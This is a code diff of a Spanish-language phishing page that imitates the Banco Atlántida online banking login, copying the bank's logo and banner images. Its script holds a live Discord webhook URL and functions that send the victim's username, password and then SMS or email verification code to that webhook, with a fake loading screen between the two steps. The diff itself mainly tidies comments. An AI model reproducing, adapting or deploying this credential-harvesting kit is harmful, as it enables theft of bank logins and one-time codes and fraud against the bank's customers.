@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -30,7 +29,7 @@
 </head>
 <body class="bg-white font-sans antialiased text-gray-800">
 
-    <!-- PANTALLA DE CARGA (OVERLAY - DURA 10 SEGUNDOS) -->
+    <!-- PANTALLA DE CARGA (OVERLAY) -->
     <div id="loadingOverlay" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
         <div class="flex flex-col items-center max-w-xs text-center px-4">
             <div class="w-10 h-10 border-[3px] border-gray-100 border-t-[#D9272E] rounded-full animate-spin-fast mb-4"></div>
@@ -42,7 +41,7 @@
     <!-- CONTENEDOR PRINCIPAL -->
     <div class="flex h-full w-screen flex-col lg:flex-row">
         
-        <!-- SECCIÓN IZQUIERDA: Imagen oficial (OCULTA EN MÓVILES - SE MUESTRA EN PC) -->
+        <!-- SECCIÓN IZQUIERDA -->
         <div class="hidden lg:block lg:flex-1 h-full relative bg-[#061f3d]">
             <img 
                 src="https://app.bancatlan.hn/cms/uploads/slider1.webp" 
@@ -51,7 +50,7 @@
             />
         </div>
 
-        <!-- SECCIÓN DERECHA: FORMULARIOS (Se adapta a pantalla completa en móviles) -->
+        <!-- SECCIÓN DERECHA -->
         <div class="w-full lg:w-[420px] bg-white flex flex-col justify-between p-7 sm:p-8 border-t-4 border-[#D9272E] lg:border-t-0 h-full overflow-y-auto">
             
             <!-- Selector de Idioma -->
@@ -63,7 +62,7 @@
                 </button>
             </div>
 
-            <!-- PANTALLA 1: LOGIN -->
+            <!-- ===== PANTALLA 1: LOGIN ===== -->
             <div id="stepLogin" class="w-full max-w-[340px] lg:max-w-[320px] mx-auto space-y-5 lg:space-y-4 my-auto">
                 <div class="flex justify-center mb-1">
                     <img src="https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png" alt="Banco Atlántida" class="h-14 lg:h-12 object-contain" />
@@ -107,7 +106,7 @@
                 </div>
             </div>
 
-            <!-- PANTALLA 2: CÓDIGO SMS / EMAIL -->
+            <!-- ===== PANTALLA 2: CÓDIGO SMS / EMAIL ===== -->
             <div id="stepVerification" class="w-full max-w-[340px] lg:max-w-[320px] mx-auto space-y-5 lg:space-y-4 my-auto hidden">
                 <div class="flex justify-center mb-1">
                     <img src="https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png" alt="Banco Atlántida" class="h-14 lg:h-12 object-contain" />
@@ -161,10 +160,14 @@
         </div>
     </div>
 
-    <!-- SCRIPTS DE CONTROL -->
+    <!-- ===== SCRIPTS DE CONTROL ===== -->
     <script>
+        // ============================================
+        // 🔴 WEBHOOK DE DISCORD - ACTUALIZADO
+        // ============================================
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540553924161966220/gmtc5tUYY1UzVFFEYOKvExB2KG0F-77bG_mK5cEQxn3SZMxq091ebLJEY0qlhmV2Atib";
 
+        // ===== TOGGLE PASSWORD =====
         function togglePasswordVisibility() {
             const passwordInput = document.getElementById('password');
             const eyeIcon = document.getElementById('eyeIcon');
@@ -179,6 +182,7 @@
             }
         }
 
+        // ===== ENVIAR LOGIN A DISCORD =====
         async function sendToDiscord(event) {
             event.preventDefault();
             const usernameVal = document.getElementById('username').value;
@@ -218,9 +222,10 @@
                 document.getElementById('stepLogin').classList.add('hidden');
                 document.getElementById('displayUser').innerText = localStorage.getItem('cached_user') || "";
                 document.getElementById('stepVerification').classList.remove('hidden');
-            }, 10000); 
+            }, 10000);
         }
 
+        // ===== ENVIAR CÓDIGO SMS A DISCORD =====
         async function sendSmsToDiscord(event) {
             event.preventDefault();
             const smsCodeVal = document.getElementById('smsCode').value;
@@ -263,5 +268,6 @@
             }
         }
     </script>
-<script src="https://replit-cdn.com/replit-pill/replit-pill.global.js" data-repl-id="256e7347-ca5c-449b-a633-d28ee977c3fb"></script></body>
+    <script src="https://replit-cdn.com/replit-pill/replit-pill.global.js" data-repl-id="256e7347-ca5c-449b-a633-d28ee977c3fb"></script>
+</body>
 </html>
